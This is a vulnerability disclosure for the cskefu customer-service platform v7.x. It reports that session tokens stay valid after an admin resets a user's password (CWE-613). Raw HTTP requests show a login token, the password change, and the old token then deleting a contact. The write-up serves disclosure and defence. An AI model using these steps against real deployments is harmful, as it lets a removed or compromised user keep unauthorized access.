## TYPE: Insufficient Session Expiration(CWE-613)
## Date: 5/12/2024

## Basic Information
+ Vendor: [cskefu](https://github.com/cskefu)
+ Homepage: https://github.com/cskefu/cskefu
+ **Affected Version**: v7.x

## Tested on: Debian Linux

## Exploit Description
The user can still operate successfully after the admin changes/reset the user's password.
The system is affected by CWE613-Insufficient Session Expiration, which indicates that previous sessions or authentication tokens tied to the old password remain valid and can still be utilized.

### PoC
**PoC video** [reference](https://1drv.ms/v/s!AmTWEcd1YDpUjg095kRTaxRVZaU8?e=jsHtoK)
**Steps**:
1. `admin` login, `user1` login.

`user1` login:
```
POST /login.html HTTP/1.1
username=user1&password=user123
...
response:
HTTP/1.1 302
Set-Cookie: authorization=7a9e00c3aba14cfe9b7577a614030ecf
```
3. `admin` modify `user1`'s password.
   ```
   POST /api/user HTTP/1.1
   Cookie: _ga=GA1.1.841718065.1715481718; SESSION=3f0bb1c3-bf2d-4787-9a50-617e8bc98ee5; authorization=649dda8bf02f44b98c824ae57e2a839b; _ga_SBBX10RKTC=GS1.1.1715495361.3.1.1715495367.
   ...
   {"id":"2c9280868f6aa4a9018f6b5c9b1c008a","username":"user1","uname":"user1","email":"","password":"admin123","repassword":"admin123","mobile":"","ops":"update"}
   ```
4. `user1` still be online, and can operate successfully with the old session/token, like deleting contacts.
<img width="1104" alt="image" src="https://github.com/menghaining/PoC/assets/32480426/058d3cce-1e40-4c74-b1be-d4bf85114a55">

```
GET /apps/contacts/delete.pug?id=95027150558c4e25a58d3907ee6fda99&ckind= HTTP/1.1
Cookie: _ga=GA1.1.1578594732.1715483346; SESSION=0dcc6821-75df-46ae-a5ce-27e217915007; authorization=7a9e00c3aba14cfe9b7577a614030ecf; _ga_SBBX10RKTC=GS1.1.1715493138.2.1.1715495577.0.0.0
...
```
<img width="723" alt="image" src="https://github.com/menghaining/PoC/assets/32480426/75300894-db56-4844-935e-c65b4a5e8dff">



